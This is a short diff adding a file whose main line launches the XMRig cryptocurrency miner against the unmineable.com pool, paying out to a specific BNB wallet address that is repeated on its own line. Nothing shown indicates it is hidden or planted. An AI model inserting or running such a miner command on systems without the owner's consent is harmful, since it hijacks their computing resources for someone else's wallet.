@@ -1,0 +1,3 @@
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u BNB:0xd6e4DA535f9A53045Ba7cc6D5Cb96887FCbbE9C8.pc1 -p x
+
+0xd6e4DA535f9A53045Ba7cc6D5Cb96887FCbbE9C8
